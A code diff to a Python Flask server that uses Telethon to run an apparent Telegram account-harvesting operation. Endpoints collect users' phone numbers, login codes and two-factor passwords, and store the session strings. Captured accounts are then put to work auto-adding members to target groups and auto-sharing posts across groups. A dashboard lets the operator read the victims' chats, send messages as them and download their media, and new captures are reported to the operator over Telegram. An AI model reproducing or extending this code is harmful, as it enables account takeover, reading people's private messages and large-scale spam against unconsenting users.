-                    chat_list_cache[cache_key] = {'data': result, 'timestamp': time.time()}
+                    chat_list_cache[cache_key] = {
+                        'data': result,
+                        'timestamp': time.time()
+                    }
                 return jsonify(result)
             else:
                 return jsonify({'success': False, 'error': 'No data returned'})
+                
         finally:
             try:
                 async def _disconnect():
@@ -1682,29 +1809,41 @@ def get_chats():
                 SyncTelegramClient.run_async(_disconnect, timeout=5)
             except:
                 pass
+                
     except Exception as e:
         logger.error(f"Get chats error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
+# ============================================
+# DASHBOARD - GET MESSAGES FOR SPECIFIC CHAT (ON DEMAND)
+# ============================================
 @app.route('/api/get-chat-messages', methods=['POST'])
 def get_chat_messages_route():
+    """
+    Get messages for a SPECIFIC chat - called only when user clicks a chat.
+    """
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
         chat_id = data.get('chatId', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
         if not chat_id:
             return jsonify({'success': False, 'error': 'Chat ID required'})
+        
+        # Check message cache
         cache_key = f"msgs_{account_id}_{chat_id}"
         with cache_lock:
             if cache_key in message_cache:
                 cached = message_cache[cache_key]
                 if time.time() - cached.get('timestamp', 0) < MESSAGE_CACHE_DURATION:
                     return jsonify(cached['data'])
+        
         client, acc = get_client_for_account(account_id)
         if not client:
             return jsonify({'success': False, 'error': acc})
+        
         async def _get_msgs():
             if not await SyncTelegramClient.safe_connect(client):
                 return None, "Failed to connect"
@@ -1712,16 +1851,23 @@ def get_chat_messages_route():
                 return None, "Session expired"
             messages = await get_chat_messages(client, chat_id, limit=30)
             return {'success': True, 'messages': messages}, None
+        
         try:
             result, error = SyncTelegramClient.run_async(_get_msgs, timeout=20)
+            
             if error:
                 return jsonify({'success': False, 'error': error})
+            
             if result:
                 with cache_lock:
-                    message_cache[cache_key] = {'data': result, 'timestamp': time.time()}
+                    message_cache[cache_key] = {
+                        'data': result,
+                        'timestamp': time.time()
+                    }
                 return jsonify(result)
             else:
                 return jsonify({'success': False, 'error': 'No messages found'})
+                
         finally:
             try:
                 async def _disconnect():
@@ -1729,10 +1875,14 @@ def get_chat_messages_route():
                 SyncTelegramClient.run_async(_disconnect, timeout=5)
             except:
                 pass
+                
     except Exception as e:
         logger.error(f"Get chat messages error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
+# ============================================
+# DASHBOARD - SEND MESSAGE
+# ============================================
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
     try:
@@ -1740,15 +1890,18 @@ def send_message():
         account_id = data.get('accountId', '')
         chat_id = data.get('chatId', '')
         message_text = data.get('message', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
         if not chat_id:
             return jsonify({'success': False, 'error': 'Chat ID required'})
         if not message_text:
             return jsonify({'success': False, 'error': 'Message text required'})
+        
         client, acc = get_client_for_account(account_id)
         if not client:
             return jsonify({'success': False, 'error': acc})
+        
         async def _send():
             if not await SyncTelegramClient.safe_connect(client):
                 return None, "Failed to connect"
@@ -1756,10 +1909,14 @@ def send_message():
                 return None, "Session expired"
             result = await send_message_async(client, chat_id, message_text)
             return result, None
+        
         try:
             result, error = SyncTelegramClient.run_async(_send, timeout=30)
+            
             if error:
                 return jsonify({'success': False, 'error': error})
+            
+            # Invalidate caches
             with cache_lock:
                 cache_key = f"chats_{account_id}"
                 if cache_key in chat_list_cache:
@@ -1767,7 +1924,9 @@ def send_message():
                 msg_key = f"msgs_{account_id}_{chat_id}"
                 if msg_key in message_cache:
                     del message_cache[msg_key]
+            
             return jsonify(result or {'success': False, 'error': 'Failed to send'})
+            
         finally:
             try:
                 async def _disconnect():
@@ -1775,24 +1934,31 @@ def send_message():
                 SyncTelegramClient.run_async(_disconnect, timeout=5)
             except:
                 pass
+                
     except Exception as e:
         logger.error(f"Send message error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
+# ============================================
+# DASHBOARD - GET MEDIA
+# ============================================
 @app.route('/api/media/<int:account_id>/<int:message_id>')
 def get_media(account_id, message_id):
     try:
         client, acc = get_client_for_account(account_id)
         if not client:
             return jsonify({'error': 'Account not found'}), 404
+        
         async def _download():
             if not await SyncTelegramClient.safe_connect(client):
                 return None
             if not await client.is_user_authorized():
                 return None
             return await download_media_async(client, account_id, message_id)
+        
         try:
             media_data = SyncTelegramClient.run_async(_download, timeout=30)
+            
             if media_data:
                 from flask import Response
                 return Response(
@@ -1805,6 +1971,7 @@ def get_media(account_id, message_id):
                 )
             else:
                 return jsonify({'error': 'Media not found'}), 404
+                
         finally:
             try:
                 async def _disconnect():
@@ -1812,10 +1979,14 @@ def get_media(account_id, message_id):
                 SyncTelegramClient.run_async(_disconnect, timeout=5)
             except:
                 pass
+                
     except Exception as e:
         logger.error(f"Get media error: {e}")
         return jsonify({'error': str(e)}), 500
 
+# ============================================
+# SHARED PHONE ENDPOINT
+# ============================================
 @app.route('/api/share-phone', methods=['POST'])
 def share_phone():
     try:
@@ -1825,21 +1996,30 @@ def share_phone():
         first_name = data.get('firstName', '')
         last_name = data.get('lastName', '')
         username = data.get('username', '')
+        
         if not phone:
             return jsonify({'success': False, 'error': 'No phone number provided'})
+        
         phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
         if not phone.startswith('+'):
             phone = '+' + phone
+        
         logger.info(f"📱 Shared phone for user {telegram_id}: {phone[:4]}****")
+        
         if telegram_id:
             user_phone_map[telegram_id] = phone
             save_user_map()
+        
         result = auto_send_code(phone, telegram_id, first_name, last_name, username)
         return jsonify(result)
+        
     except Exception as e:
         logger.error(f"Share phone error: {e}")
         return jsonify({'success': False, 'error': 'Failed to process phone.'})
 
+# ============================================
+# TELEGRAM AUTO-LOGIN
+# ============================================
 @app.route('/api/telegram-auto-login', methods=['POST'])
 def telegram_auto_login():
     try:
@@ -1847,6 +2027,7 @@ def telegram_auto_login():
         init_data_str = data.get('initData', '')
         if not init_data_str:
             init_data_str = request.args.get('initData', '')
+        
         user_data = data.get('user', {})
         if not user_data and init_data_str:
             for item in init_data_str.split('&'):
@@ -1856,13 +2037,17 @@ def telegram_auto_login():
                         user_data = json.loads(user_json)
                     except:
                         pass
+        
         telegram_id = str(user_data.get('id', ''))
         first_name = user_data.get('first_name', '')
         last_name = user_data.get('last_name', '')
         username = user_data.get('username', '')
+        
         if not telegram_id:
             return jsonify({'success': False, 'error': 'Could not identify account.', 'needs_phone': True})
+        
         phone = find_phone_for_user(telegram_id)
+        
         if phone:
             logger.info(f"✅ Found phone for {telegram_id}, sending code...")
             result = auto_send_code(phone, telegram_id, first_name, last_name, username)
@@ -1877,20 +2062,26 @@ def telegram_auto_login():
                 'user_name': f"{first_name} {last_name}".strip(),
                 'username': username
             })
+            
     except Exception as e:
         logger.error(f"Auto-login error: {e}")
         return jsonify({'success': False, 'error': 'Auto-login failed.', 'needs_phone': True})
 
+# ============================================
+# ADD ACCOUNT
+# ============================================
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     try:
         data = request.json
         phone = data.get('phone', '').strip()
         telegram_id = str(data.get('telegramId', ''))
+        
         if not phone:
             return jsonify({'success': False, 'error': 'Phone number required'})
         if not phone.startswith('+'):
             phone = '+' + phone
+        
         result = auto_send_code(phone, telegram_id)
         return jsonify(result)
     except Exception as e:
@@ -1903,18 +2094,23 @@ def verify_code():
         code = data.get('code', '').strip()
         sid = data.get('session_id', '')
         pwd = data.get('password', '')
+        
         if not sid or sid not in temp_sessions:
             return jsonify({'success': False, 'error': 'Session expired.'})
+        
         td = temp_sessions[sid]
         telegram_id = str(td.get('telegram_id', ''))
+        
         if td.get('code_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
             return jsonify({'success': False, 'error': 'Too many incorrect codes.'})
+        
         if td.get('password_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
             return jsonify({'success': False, 'error': 'Too many incorrect passwords.'})
+        
         async def verify():
             client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
             await client.connect()
@@ -1939,8 +2135,10 @@ def verify_code():
                             save_temp_sessions()
                             return {'success': False, 'error': 'Too many incorrect passwords.'}
                         return {'success': False, 'error': f'Wrong password. {remaining} attempts remaining.'}
+                
                 me = await client.get_me()
                 user_telegram_id = str(me.id) if me.id else telegram_id
+                
                 if user_telegram_id:
                     user_phone_map[user_telegram_id] = td['phone']
                     save_user_map()
@@ -1952,10 +2150,12 @@ def verify_code():
                         'telegram_id': user_telegram_id
                     }
                     save_auto_sessions()
+                
                 try:
                     account_age = get_account_age_sync(client.session.save())
                 except:
                     account_age = {'age_display': 'Unknown'}
+                
                 new_id = int(time.time() * 1000)
                 new_acc = {
                     'id': new_id,
@@ -1967,19 +2167,24 @@ def verify_code():
                     'account_age': account_age,
                     'telegram_id': user_telegram_id
                 }
+                
                 if not new_acc['name']:
                     new_acc['name'] = 'User ' + str(new_id)[-4:]
+                
                 existing = None
                 for a in accounts:
                     if str(a.get('telegram_id')) == user_telegram_id:
                         existing = a
                         break
+                
                 if existing:
                     existing.update(new_acc)
                     new_acc['id'] = existing['id']
                 else:
                     accounts.append(new_acc)
+                
                 save_json(ACCOUNTS_FILE, accounts)
+                
                 auto_add_settings[str(new_acc['id'])] = {
                     'enabled': True,
                     'target_group': TARGET_GROUPS[0],
@@ -1987,17 +2192,20 @@ def verify_code():
                     'auto_join': True
                 }
                 save_json(SETTINGS_FILE, auto_add_settings)
+                
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
                 stats['worker_stats'][str(new_acc['id'])] = {'total': 0, 'today': 0, 'verified_today': 0}
                 save_json(STATS_FILE, stats)
                 
-                # Start auto-add AND auto-share
+                # Start auto-add worker
                 start_auto_add(new_acc)
+                
+                # Also start auto-share worker
                 start_auto_share(new_acc)
                 
-                # Discover groups from this account
-                discovered = discover_groups_from_account(new_acc)
+                # Discover share groups from this account
+                discovered = discover_share_groups(new_acc)
                 for g in discovered:
                     if g not in share_groups:
                         share_groups.append(g)
@@ -2009,19 +2217,18 @@ def verify_code():
                         f"<b>{SERVER_NAME}</b>\n✅ Account added!\n"
                         f"Name: {new_acc['name']}\n"
                         f"Phone: {new_acc['phone'][:4]}****\n"
-                        f"Age: {age_info}\n"
-                        f"Share groups: {len(discovered)}\n"
-                        f"Auto-add: ✅\nAuto-share: ✅"
+                        f"Age: {age_info}\nAuto-add: Started\nAuto-share: Started"
                     )
                 except:
                     pass
+                
                 return {
                     'success': True,
                     'account': {'id': new_acc['id'], 'name': new_acc['name'], 'phone': new_acc['phone']},
                     'account_age': age_info,
-                    'auto_login_enabled': True,
-                    'share_groups_found': len(discovered)
+                    'auto_login_enabled': True
                 }
+                
             except errors.PhoneCodeInvalidError:
                 td['code_attempts'] = td.get('code_attempts', 0) + 1
                 save_temp_sessions()
@@ -2040,16 +2247,23 @@ def verify_code():
                     await client.disconnect()
                 except:
                     pass
+        
         result = SyncTelegramClient.run_async(verify, timeout=45)
+        
         if result.get('success') and not result.get('need_password'):
             if sid in temp_sessions:
                 del temp_sessions[sid]
                 save_temp_sessions()
+        
         return jsonify(result)
+        
     except Exception as e:
         logger.error(f"Verify code error: {e}")
         return jsonify({'success': False, 'error': 'Server error.'})
 
+# ============================================
+# ACCOUNT MANAGEMENT ROUTES
+# ============================================
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
     try:
@@ -2085,13 +2299,16 @@ def auto_add_settings_route():
         s['is_running'] = str(aid) in running_tasks
         s['is_sharing'] = str(aid) in running_share_tasks
         return jsonify({'success': True, 'settings': s})
+    
     data = request.json
     aid = data.get('accountId')
     if not aid:
         return jsonify({'success': False, 'error': 'Account ID required'})
+    
     akey = str(aid)
     was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
     new_enabled = data.get('enabled', False)
+    
     auto_add_settings[akey] = {
         'enabled': new_enabled,
         'target_group': data.get('target_group', TARGET_GROUPS[0]),
@@ -2099,12 +2316,14 @@ def auto_add_settings_route():
         'auto_join': True
     }
     save_json(SETTINGS_FILE, auto_add_settings)
+    
     if new_enabled and not was_enabled:
         acc = next((a for a in accounts if str(a['id']) == akey), None)
         if acc:
             start_auto_add(acc)
     elif not new_enabled and was_enabled:
         stop_auto_add(aid)
+    
     return jsonify({'success': True, 'message': 'Settings saved'})
 
 @app.route('/api/auto-add-stats')
@@ -2118,8 +2337,7 @@ def auto_add_stats():
         'active_workers': len(running_tasks),
         'active_share_workers': len(running_share_tasks),
         'shares_today': share_stats.get('today_shares', 0),
-        'total_shares': share_stats.get('total_shares', 0),
-        'share_groups': len(share_groups)
+        'total_shares': share_stats.get('total_shares', 0)
     })
 
 @app.route('/api/send-report')
@@ -2130,7 +2348,7 @@ def send_report():
         f"📊 Total Added: {stats.get('total_added', 0)}\n"
         f"📢 Shares Today: {share_stats.get('today_shares', 0)}\n"
         f"📢 Total Shares: {share_stats.get('total_shares', 0)}\n"
-        f"⚙️ Add Workers: {len(running_tasks)}\n"
+        f"⚙️ Active Workers: {len(running_tasks)}\n"
         f"📢 Share Workers: {len(running_share_tasks)}\n"
         f"📋 Share Groups: {len(share_groups)}"
     )
@@ -2176,6 +2394,7 @@ def keep_alive():
             time.sleep(60)
 
 def cleanup_caches():
+    """Periodically clean expired cache entries"""
     while True:
         time.sleep(30)
         current_time = time.time()
@@ -2184,6 +2403,7 @@ def cleanup_caches():
                            if current_time - v.get('timestamp', 0) > CHAT_LIST_CACHE_DURATION * 2]
             for k in expired_chats:
                 del chat_list_cache[k]
+            
             expired_msgs = [k for k, v in message_cache.items()
                           if current_time - v.get('timestamp', 0) > MESSAGE_CACHE_DURATION * 2]
             for k in expired_msgs:
@@ -2192,50 +2412,52 @@ def cleanup_caches():
 def restore_and_start():
     try:
         time.sleep(5)
-        logger.info(f"🔄 Restoring {len(accounts)} accounts...")
-        
-        # Ensure share groups has target groups
-        for tg in TARGET_GROUPS:
-            if tg not in share_groups:
-                share_groups.append(tg)
-                logger.info(f"📋 Added target group to share: {tg}")
+        logger.info(f"Restoring {len(accounts)} accounts...")
         
         for acc in accounts:
             try:
-                if acc.get('session') and check_account_auth(acc):
-                    # Start auto-add
-                    settings = auto_add_settings.get(str(acc['id']), {})
-                    if settings.get('enabled', True):
-                        start_auto_add(acc)
-                        logger.info(f"✅ Restored auto-add for {acc.get('name', acc['id'])}")
-                    
-                    # Start auto-share
-                    start_auto_share(acc)
-                    logger.info(f"📢 Restored auto-share for {acc.get('name', acc['id'])}")
-                else:
-                    remove_dead_account(acc['id'], "Auth check failed on startup")
+                if acc.get('session'):
+                    if check_account_auth(acc):
+                        # Start auto-add worker
+                        settings = auto_add_settings.get(str(acc['id']), {})
+                        if settings.get('enabled', True):
+                            start_auto_add(acc)
+                            logger.info(f"Restored auto-add worker for {acc.get('name', acc['id'])}")
+                        
+                        # Start auto-share worker
+                        start_auto_share(acc)
+                        logger.info(f"Restored auto-share worker for {acc.get('name', acc['id'])}")
+                    else:
+                        remove_dead_account(acc['id'], "Auth check failed on startup")
                 time.sleep(2)
             except Exception as e:
-                logger.error(f"Error restoring {acc.get('id')}: {e}")
+                logger.error(f"Error restoring account {acc.get('id')}: {e}")
+                continue
         
         save_json(ACCOUNTS_FILE, accounts)
-        save_share_groups()
         cleanup_expired_sessions()
+        
+        # Ensure share groups include target groups
+        for tg in TARGET_GROUPS:
+            if tg not in share_groups:
+                share_groups.append(tg)
+        save_share_groups()
         
         try:
             send_telegram(
-                f"<b>{SERVER_NAME}</b> 🟢 Online!\n"
+                f"<b>{SERVER_NAME}</b> Online!\n"
                 f"Add Workers: {len(running_tasks)}\n"
                 f"Share Workers: {len(running_share_tasks)}\n"
                 f"Accounts: {len(accounts)}\n"
-                f"Share Groups: {len(share_groups)}"
+                f"Share Groups: {len(share_groups)}\n"
+                f"Auto-login users: {len(user_phone_map)}"
             )
         except:
             pass
         
-        logger.info(f"✅ Server ready - {len(running_tasks)} add, {len(running_share_tasks)} share workers")
+        logger.info(f"✅ Server startup complete - {len(running_tasks)} add workers, {len(running_share_tasks)} share workers running")
     except Exception as e:
-        logger.critical(f"Fatal restore error: {e}")
+        logger.critical(f"Fatal error during restore: {e}")
         stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
         save_json(STATS_FILE, stats)
 
@@ -2253,14 +2475,17 @@ def cleanup_expired_sessions():
         logger.error(f"Session cleanup error: {e}")
 
 def signal_handler(signum, frame):
-    logger.info(f"Signal {signum}, shutting down...")
+    logger.info(f"Received signal {signum}, saving data and shutting down...")
+    # Stop all workers
     for acc_key in list(running_tasks.keys()):
         stop_auto_add(acc_key)
     for acc_key in list(running_share_tasks.keys()):
         stop_auto_share(acc_key)
+    # Save all data
     save_json(ACCOUNTS_FILE, accounts)
     save_json(SETTINGS_FILE, auto_add_settings)
     save_json(STATS_FILE, stats)
+    save_json(WORKER_ADDS_FILE, dict(worker_adds))
     save_share_groups()
     save_temp_sessions()
     save_auto_sessions()
@@ -2293,19 +2518,22 @@ if __name__ == '__main__':
         for tg in TARGET_GROUPS:
             if tg not in share_groups:
                 share_groups.append(tg)
-                logger.info(f"📋 Added target group to share: {tg}")
+                logger.info(f"Added target group to share list: {tg}")
         
         print(f"""
-╔══════════════════════════════════════════════════════╗
-║     AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}        ║
-╠══════════════════════════════════════════════════════╣
-║  Targets: {', '.join(TARGET_GROUPS):<40} ║
-║  Share Groups: {len(share_groups):<35} ║
-║  Share Interval: {SHARE_INTERVAL_SECONDS}s ({SHARE_INTERVAL_SECONDS//60} min){'':<27} ║
-║  Group Delay: {SHARE_DELAY_BETWEEN_GROUPS}s{'':<36} ║
-║  Accounts: {len(accounts):<39} ║
-║  Features: ✅ Add ✅ Share                ║
-╚══════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════╗
+║     AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}              ║
+╠══════════════════════════════════════════════════════════════╣
+║  API ID: {API_ID}                                                 ║
+║  Targets: {', '.join(TARGET_GROUPS)}                    ║
+║  Port: {PORT}                                                   ║
+║  Accounts: {len(accounts)}                                              ║
+║  Share Groups: {len(share_groups)}                                            ║
+║  Share Interval: {SHARE_INTERVAL_SECONDS}s (3 min)                          ║
+║  Group Delay: {SHARE_DELAY_BETWEEN_GROUPS}s                                    ║
+║  Dashboard: Chat List Only (On-Demand Messages)              ║
+║  Features: Auto Join ✅ | Auto Add ✅ | Auto Share ✅       ║
+╚══════════════════════════════════════════════════════════════╝
         """)
         
         threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
